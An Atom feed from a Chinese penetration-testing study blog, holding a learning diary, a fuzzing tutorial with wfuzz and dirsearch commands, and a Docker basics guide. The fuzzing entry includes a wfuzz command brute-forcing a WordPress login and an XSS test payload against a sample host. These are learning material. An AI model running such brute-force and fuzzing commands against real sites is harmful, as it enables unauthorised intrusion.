<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆时光</title>
  
  <subtitle>忆时光</subtitle>
  <link href="http://lvpsectime.github.io/atom.xml" rel="self"/>
  
  <link href="http://lvpsectime.github.io/"/>
  <updated>2020-07-11T04:12:30.252Z</updated>
  <id>http://lvpsectime.github.io/</id>
  
  <author>
    <name>ca5tle</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日志</title>
    <link href="http://lvpsectime.github.io/2100/01/01/%E6%97%A5%E5%BF%97/"/>
    <id>http://lvpsectime.github.io/2100/01/01/%E6%97%A5%E5%BF%97/</id>
    <published>2099-12-31T16:00:00.000Z</published>
    <updated>2020-07-11T04:12:30.252Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2020-04-25"><a href="#2020-04-25" class="headerlink" title="2020.04.25"></a>2020.04.25</h2><h3 id="今日完成"><a href="#今日完成" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>将hexo博客部署到腾讯云</li></ol><h3 id="明日计划"><a href="#明日计划" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>hexo博客Links搭建</li><li>XSS学习</li></ol><h2 id="2020-04-26"><a href="#2020-04-26" class="headerlink" title="2020.04.26"></a>2020.04.26</h2><h3 id="今日完成-1"><a href="#今日完成-1" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>Links基本完成，仍需要完善</li><li>通达OA任意文件上传+文件包含漏洞复现未完成</li></ol><h3 id="明日计划-1"><a href="#明日计划-1" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>XSS学习</li><li>通达OA通达OA任意文件上传+文件包含漏洞复现</li><li>通达OA任意用户登录</li></ol><h2 id="2020-04-27"><a href="#2020-04-27" class="headerlink" title="2020.04.27"></a>2020.04.27</h2><h3 id="今日完成-2"><a href="#今日完成-2" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>XSS分类：反射型、存储型、DOM型</li><li>通达OA任意用户登录复现</li><li>反弹shell备忘录</li></ol><h3 id="明日计划-2"><a href="#明日计划-2" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>XSS基础</li><li>端口漏洞备忘录</li><li>整理PHPlist、Tomcat ajp漏洞复现</li></ol><h2 id="2020-04-28"><a href="#2020-04-28" class="headerlink" title="2020.04.28"></a>2020.04.28</h2><h3 id="今日完成-3"><a href="#今日完成-3" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>端口漏洞备忘录</li><li>通达OA任意文件上传+文件包含漏洞复现完成</li></ol><h3 id="明日计划-3"><a href="#明日计划-3" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>XSS学习</li><li>MySQL写shell</li></ol><h2 id="2020-04-29"><a href="#2020-04-29" class="headerlink" title="2020.04.29"></a>2020.04.29</h2><h3 id="今日完成-4"><a href="#今日完成-4" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>MySQL注入点写shell</li><li>XSS分类、基础原理</li></ol><h3 id="明日计划-4"><a href="#明日计划-4" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>XSS靶场</li></ol><h2 id="2020-04-30"><a href="#2020-04-30" class="headerlink" title="2020.04.30"></a>2020.04.30</h2><h3 id="今日完成-5"><a href="#今日完成-5" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>搭建web for pentester</li></ol><h3 id="明日计划-5"><a href="#明日计划-5" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>XSS靶场练习</li><li>渗透测试流程</li></ol><h2 id="2020-05-01"><a href="#2020-05-01" class="headerlink" title="2020.05.01"></a>2020.05.01</h2><h3 id="今日完成-6"><a href="#今日完成-6" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>web for pentester之XSS</li></ol><h3 id="明日计划-6"><a href="#明日计划-6" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>操作系统前3个实验</li><li>disable_function bypass</li></ol><h2 id="2020-05-02"><a href="#2020-05-02" class="headerlink" title="2020.05.02"></a>2020.05.02</h2><h3 id="今日完成-7"><a href="#今日完成-7" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>无</li></ol><h3 id="明日计划-7"><a href="#明日计划-7" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>操作系统实验</li></ol><h2 id="2020-05-03"><a href="#2020-05-03" class="headerlink" title="2020.05.03"></a>2020.05.03</h2><h3 id="今日完成-8"><a href="#今日完成-8" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>无</li></ol><h3 id="明日计划-8"><a href="#明日计划-8" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>无</li></ol><h2 id="2020-05-04"><a href="#2020-05-04" class="headerlink" title="2020.05.04"></a>2020.05.04</h2><h3 id="今日完成-9"><a href="#今日完成-9" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>操作系统前3个实验</li><li>XSS之旅 <a href="http://test.ctf8.com/">http://test.ctf8.com/</a></li></ol><h3 id="明日计划-9"><a href="#明日计划-9" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>XSS靶场一</li><li>disable_bypass</li></ol><h2 id="2020-05-13"><a href="#2020-05-13" class="headerlink" title="2020.05.13"></a>2020.05.13</h2><h3 id="今日完成-10"><a href="#今日完成-10" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>CVE-2020-2555</li></ol><h2 id="2020-05-15"><a href="#2020-05-15" class="headerlink" title="2020.05.15"></a>2020.05.15</h2><h3 id="今日完成-11"><a href="#今日完成-11" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>红日安全红队靶场（四）的get shell，并且docker逃逸(特权 –privileged)</li></ol><h3 id="明日计划-10"><a href="#明日计划-10" class="headerlink" title="明日计划"></a>明日计划</h3><ol><li>红日安全红队靶场（四）内网渗透</li><li>chisel代理使用</li></ol><h2 id="2020-05-16"><a href="#2020-05-16" class="headerlink" title="2020.05.16"></a>2020.05.16</h2><h3 id="今日完成-12"><a href="#今日完成-12" class="headerlink" title="今日完成"></a>今日完成</h3><ol><li>红日安全红队靶场（四）内网渗透，打到域控</li><li>chisel学习</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2020-04-25&quot;&gt;&lt;a href=&quot;#2020-04-25&quot; class=&quot;headerlink&quot; title=&quot;2020.04.25&quot;&gt;&lt;/a&gt;2020.04.25&lt;/h2&gt;&lt;h3 id=&quot;今日完成&quot;&gt;&lt;a href=&quot;#今日完成&quot; class=&quot;head</summary>
      
    
    
    
    <category term="日志" scheme="http://lvpsectime.github.io/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://lvpsectime.github.io/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>日常记录</title>
    <link href="http://lvpsectime.github.io/2099/12/31/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    <id>http://lvpsectime.github.io/2099/12/31/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-05-13T10:20:55.193Z</updated>
    
    <content type="html"><![CDATA[<h2 id="骚操作"><a href="#骚操作" class="headerlink" title="骚操作"></a>骚操作</h2><ol><li>利用环境变量获取网站根目录，比如<code>cd</code>输出当前目录</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;骚操作&quot;&gt;&lt;a href=&quot;#骚操作&quot; class=&quot;headerlink&quot; title=&quot;骚操作&quot;&gt;&lt;/a&gt;骚操作&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;利用环境变量获取网站根目录，比如&lt;code&gt;cd&lt;/code&gt;输出当前目录&lt;/li&gt;
&lt;/ol&gt;
</summary>
      
    
    
    
    <category term="总结" scheme="http://lvpsectime.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="备忘录" scheme="http://lvpsectime.github.io/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>易错知识</title>
    <link href="http://lvpsectime.github.io/2099/12/31/%E6%98%93%E9%94%99%E7%9F%A5%E8%AF%86/"/>
    <id>http://lvpsectime.github.io/2099/12/31/%E6%98%93%E9%94%99%E7%9F%A5%E8%AF%86/</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2020-04-25T03:09:14.921Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>常用工具列表</title>
    <link href="http://lvpsectime.github.io/2020/12/31/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/"/>
    <id>http://lvpsectime.github.io/2020/12/31/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%88%97%E8%A1%A8/</id>
    <published>2020-12-31T10:41:19.000Z</published>
    <updated>2020-05-05T12:45:45.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h2><ol><li>Firefox</li></ol><h2 id="编程开发"><a href="#编程开发" class="headerlink" title="编程开发"></a>编程开发</h2><ol><li>pycharm</li><li>sublime text 3</li><li>codeblocks</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;h2 id=&quot;渗透工具&quot;&gt;&lt;a href=&quot;#渗透工具&quot; class=&quot;headerlink&quot; title=&quot;渗透工具&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/categories/Tools/"/>
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Fuzz与漏洞挖掘</title>
    <link href="http://lvpsectime.github.io/2020/12/09/Fuzz%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>http://lvpsectime.github.io/2020/12/09/Fuzz%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2020-12-09T02:23:42.000Z</published>
    <updated>2020-12-09T08:01:08.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fuzz一直是渗透测试中比较重要的技术，之前一直是听说并没有学习过，今天在漏洞银行看了一期视频<a href="https://www.bugbank.cn/live/view.html?id=111909">[87期]看Fuzz与漏洞挖掘擦出火花</a>，感觉讲的挺好的。在此记录一下。</p><h2 id="目录Fuzz-base"><a href="#目录Fuzz-base" class="headerlink" title="目录Fuzz(base)"></a>目录Fuzz(base)</h2><h3 id="Fuzz敏感目录"><a href="#Fuzz敏感目录" class="headerlink" title="Fuzz敏感目录"></a>Fuzz敏感目录</h3><h4 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h4><p>一款经典的目录扫描工具。</p><p>它的工作原理就是： <code>http://domain.com/+目录字典</code></p><p>一般我们的目录字典是这样子的</p><p><img src="/.io//1.png" alt="目录字典"></p><p>那么这种扫描有什么好处呢？就是针对一部分网站可以扫描的全面，只要你的字典足够强大就可以扫描到绝大多部分的目录和文件，来自<code>Blasting_dictionary</code>的爆破字典很好，github地址<code>https://github.com/rootphantomer/Blasting_dictionary</code>这里的103w+目录字典就很符合御剑的模式，其实也就是看程序员的命名。</p><h4 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h4><p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件</p><p><a href="https://github.com/maurosoria/dirsearch">下载地址</a></p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u url -e php</span><br></pre></td></tr></table></figure><h4 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a>Dirb</h4><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb url 字典</span><br></pre></td></tr></table></figure><p>kali自带字典<code>/usr/share/wordlist/dirb/...</code></p><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p>wfuzz据说是最好用的一款fuzz工具，不过每个人喜欢的都不一样，适合自己的才是最好的。</p><p>使用方法：<a href="https://blog.csdn.net/JBlock/article/details/88619117">wfuzz使用教程</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hc 404</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hw 123 返回包大小</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hs &quot;Not found&quot; 返回内容</span><br><span class="line">wfuzz -c -z file,/root/dic1.txt -z file,/root/dic2.txt -hs xx1 -hs xx2 -d &quot;log=FUZZ&amp;pwd=FUZ2Z&quot; http://ip/wp-login.php</span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="403"><a href="#403" class="headerlink" title="403"></a>403</h4><p><img src="/.io//2.png" alt="403"></p><h4 id="Hidden-XSS"><a href="#Hidden-XSS" class="headerlink" title="Hidden XSS"></a>Hidden XSS</h4><p>原文链接：<a href="https://markitzeroday.com/xss/finding/2018/02/03/hidden-xss.html">https://markitzeroday.com/xss/finding/2018/02/03/hidden-xss.html</a></p><p><img src="/.io//3.png"></p><p>用<code>Nikto</code>做目录Fuzz，发现了<code>/test/</code>目录，访问<code>/test/</code></p><p><img src="/.io//4.png"></p><p>返回<code>NULL</code>，接着使用<code>wfuzz</code>做参数Fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hh 53 &#x27;http://rob-sec-1.com/test/?FUZZ=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.3 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: HTTP://rob-sec-1.com/test/?FUZZ=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">Total requests: 4614</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">IDResponse   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">02127:  C=200      9 L       8 W     84 Ch  &quot;item&quot;</span><br><span class="line"></span><br><span class="line">Total time: 14.93025</span><br><span class="line">Processed Requests: 4614</span><br><span class="line">Filtered Requests: 4613</span><br><span class="line">Requests/sec.: 309.0369</span><br></pre></td></tr></table></figure><p>发现了<code>item</code>参数，访问<code>http://domain/test/?item=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，成功弹窗</p><p><img src="/.io//5.png"></p><h2 id="参数Fuzz"><a href="#参数Fuzz" class="headerlink" title="参数Fuzz"></a>参数Fuzz</h2><p>以sqli-labs第29关为例</p><p>使用wfuzz自带的sqlfuzzer测试参数</p><p><img src="/.io//6.png" alt="wfuzz"></p><p>把结果导出为html文件</p><p><img src="/.io//7.png" alt="wfuzz"></p><p>看一下fuzz的结果</p><p><img src="/.io//8.png" alt="wfuzz"></p><p><img src="/.io//9.png" alt="wfuzz"></p><p>通过fuzz就发现这一关存在sql语句的报错！那么就有可能存在报错注入！fuzz更多时就会发现一些绕过它waf的情况。</p><h2 id="Payload-Fuzz-bypass"><a href="#Payload-Fuzz-bypass" class="headerlink" title="Payload Fuzz(bypass)"></a>Payload Fuzz(bypass)</h2><p>参考：<a href="https://blog.csdn.net/JBlock/article/details/88617906">FUZZ过某狗</a></p><p>所谓payload fuzz其实就是通过大量测试枚举字符组合，最终得到能够绕过WAF的有效载荷！</p><h2 id="URL跳转与SSRF"><a href="#URL跳转与SSRF" class="headerlink" title="URL跳转与SSRF"></a>URL跳转与SSRF</h2><p>参数Fuzz和payload fuzz</p><h2 id="后缀名Fuzz"><a href="#后缀名Fuzz" class="headerlink" title="后缀名Fuzz"></a>后缀名Fuzz</h2><p>文件上传，fuzz允许上传的后缀名</p><h2 id="CRLF-Fuzz"><a href="#CRLF-Fuzz" class="headerlink" title="CRLF Fuzz"></a>CRLF Fuzz</h2><p><code>CRLF</code>是<code>Carriage-Return Line-Feed</code>的缩写，意思是回车换行，回车(CR, ASCII 13, \r)，换行(LF, ASCII 10, \n)，CRLF字符(%0d%0a)</p><h2 id="XSS-Payload-Fuzz"><a href="#XSS-Payload-Fuzz" class="headerlink" title="XSS Payload Fuzz"></a>XSS Payload Fuzz</h2><p><a href="https://github.com/NytroRST/XSSFuzzer">XSS Fuzzer</a></p><p><img src="/.io//10.png" alt="wfuzz"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉Fuzz还是枚举吧，关键在于字典是否强大。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fuzzdb</span><br><span class="line">https://github.com/Fuzzdb-project/Fuzzdb</span><br><span class="line">seclist</span><br><span class="line">https://github.com/danielmiessler/SecLists</span><br><span class="line">某大牛的字典</span><br><span class="line">https://github.com/bl4de/dictionaries/</span><br><span class="line">https://github.com/1N3/IntruderPayloads/</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Fuzz一直是渗透测试中比较重要的技术，之前一直是听说并没有学习过，今天在漏洞银行看了一期视频&lt;a href=&quot;https://www.bu</summary>
      
    
    
    
    <category term="渗透" scheme="http://lvpsectime.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Fuzz" scheme="http://lvpsectime.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Docker从0到1</title>
    <link href="http://lvpsectime.github.io/2020/10/21/Docker%E4%BB%8E0%E5%88%B01/"/>
    <id>http://lvpsectime.github.io/2020/10/21/Docker%E4%BB%8E0%E5%88%B01/</id>
    <published>2020-10-21T08:18:12.000Z</published>
    <updated>2020-11-04T06:41:26.933Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p><a href="https://www.cnblogs.com/wt7018/p/11880666.html" title="安装docker">安装docker</a><br><a href="https://blog.csdn.net/oYinHeZhiGuang/article/details/88791009" title="安装docker-compose">安装docker-compose</a><br><a href="https://www.cnblogs.com/hwlong/p/9158982.html" title="docker简介">docker简介</a></p><h2 id="0x01-Docker常用命令"><a href="#0x01-Docker常用命令" class="headerlink" title="0x01 Docker常用命令"></a>0x01 Docker常用命令</h2><p>以下命令均在root下<br>启动docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><p>查看当前镜像列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>导入镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker import [options] file|URL|- [REPOSITORY[:TAG]]</span><br><span class="line">例：</span><br><span class="line">docker import music.tar music:centos</span><br><span class="line">导入以前导出的用Dockerfile生成的镜像，然后修改它的REPOSITORY为music,TAG为centos</span><br></pre></td></tr></table></figure><p>导出镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker export [OPTIONS] CONTAINER</span><br><span class="line">例：</span><br><span class="line">docker export -o test-mysql.tar &lt;容器 ID&gt;</span><br></pre></td></tr></table></figure><p>进入镜像的终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i music:centos /bin/bash</span><br><span class="line"></span><br><span class="line">退出： exit</span><br><span class="line">参数说明：</span><br><span class="line">-i: 交互式操作</span><br><span class="line">-t: 终端</span><br><span class="line">music:centos: 镜像</span><br><span class="line">/bin/bash: 交互式shell</span><br></pre></td></tr></table></figure><p>网络端口映射</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 1001:80 music:centos /run.sh</span><br><span class="line"></span><br><span class="line">-d: 后台运行</span><br><span class="line">-p: 指定端口 宿主机端口:容器端口</span><br></pre></td></tr></table></figure><p>删除容器进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f ID</span><br></pre></td></tr></table></figure><p>查看所有容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>查看正在运行的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>docker停止一个容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID</span><br></pre></td></tr></table></figure><p>开启以关闭容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器ID</span><br></pre></td></tr></table></figure><p>删除镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像ID</span><br></pre></td></tr></table></figure><p>使用dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t test-mysql</span><br><span class="line">docker build为创建镜像命令</span><br><span class="line">名称为test-mysql</span><br><span class="line">&#x27;.&#x27;表示当前目录即Dockerfile文件所在的目录</span><br></pre></td></tr></table></figure><p>进入一个以开启的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器ID /bin/bash</span><br></pre></td></tr></table></figure><p>从宿主机复制文件到容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 本地文件 容器ID:路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker search [keywords] 搜寻与keywords相关的镜像</span><br><span class="line">docker images  查看本地的image镜像</span><br><span class="line">docker pull [image] 拉取镜像</span><br><span class="line">docker run -d -p [host port]:[docker port] [image] 新建一个docker容器，并映射端口号</span><br><span class="line">docker ps -a 查看运行中的docker容器</span><br><span class="line">docker exec -it [container id] bash 进入一个docker容器</span><br><span class="line">docker cp [本地路径] [container id]:[container 路径] 拷贝本地文件到docker</span><br><span class="line">docker start [container id] 启动一个docker容器</span><br><span class="line">docker stop [container id] 停止一个docker容器</span><br><span class="line">docker rm [container id] 删除一个docker容器(需要先停止容器才能删除容器)</span><br><span class="line">docker rmi [image id] 删除一个docker镜像(需要删除镜像对应的容器才能删除镜像)</span><br></pre></td></tr></table></figure><h2 id="0x02-实例"><a href="#0x02-实例" class="headerlink" title="0x02 实例"></a>0x02 实例</h2><p>下面以一道ctf为例<br>搜索环境镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure><p>拉取环境需要的镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure><p>用镜像创建容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@test:~# docker run -d -p 8888:80 tutum/lamp</span><br><span class="line">cb0bc63b1ebbec1258c9eb0c97415a0ccf6a323a60cddcc361006f59f77a3c2e</span><br><span class="line">这一串数字为容器ID</span><br></pre></td></tr></table></figure><p>上传本地文件到容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/test/2019JNUCTF/Web/easyupload/ cb0bc63b1ebbec1258c9eb:/var/www/html</span><br><span class="line">容器ID可以不用写全，只写前面几位也是可以的</span><br></pre></td></tr></table></figure><p>访问 <code>ip:8888/easyupload</code> 成功。<br><img src="/.io//1.png"></p><h2 id="0x03-Dockerfile"><a href="#0x03-Dockerfile" class="headerlink" title="0x03 Dockerfile"></a>0x03 Dockerfile</h2><p>我们可以把构建一道题目的过程分为以下具体三步。</p><ol><li>指定具体要使用的镜像</li><li>启动镜像，构建一个容器</li><li>移入相关的源码，构建容器里面的环境配置<br>在上面的实例中，我们第三步里面需要进行的操作只有把源码移入/var/www/html文件夹里面而已，但如果环境配置较为复杂，比如需要构建数据库，安装各种插件等，第三步需要的时间就太长了。如果我们改变下上面的步骤。变成：</li><li>指定使用的镜像</li><li>配置相关的环境，移入相关的代码</li><li>根据第二步的内容，把这些操作以类似于代码，程序的模式写入一个模板，让Docker根据这个模板来生成新的镜像</li><li>根据这个新的镜像来生成新的容器<br>如果是这么操作的话，带来的好处就是可以方便的构造出一个针对性的镜像。配置题目的时候，我们只需要根据这个我们创作的模板生成特制的镜像，直接按照这个镜像就可以直接生成环境了。这个需要的模板就是<code>Dockerfile</code>。<br><code>Dockerfile</code>是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker通过读取<code>Dockerfile</code>中的指令自动生成映像。<br><code>docker build</code>命令用于从Dockerfile构建映像。可以在<code>docker build</code>命令中使用-f标志指向文件系统中任何位置的<code>Dockerfile</code>。<br><code>Dockerfile</code> 一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，<code>#</code> 为 Dockerfile 中的注释。<br>Docker以从上到下的顺序运行<code>Dockerfile</code>的指令。为了指定基本映像，第一条指令必须是<code>FROM</code>。一个声明以＃字符开头则被视为注释。可以在Docker文件中使用<code>RUN</code>，<code>CMD</code>，<code>FROM</code>，<code>EXPOSE</code>，<code>ENV</code>等指令。</li></ol><p><strong>常用指令</strong><br>FROM： 指定基础镜像，必须为第一个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM &lt;image&gt;</span><br><span class="line">FROM &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">FROM &lt;image&gt;@&lt;digest&gt;</span><br><span class="line">例：</span><br><span class="line">  FROM php:5.6</span><br><span class="line">tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure><p>MAINTAINER: 维护者信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MAINTAINER &lt;name&gt;</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">    MAINTAINER zhangsan</span><br><span class="line">MAINTAINER 123@163.com</span><br></pre></td></tr></table></figure><p>RUN: 构建镜像时执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 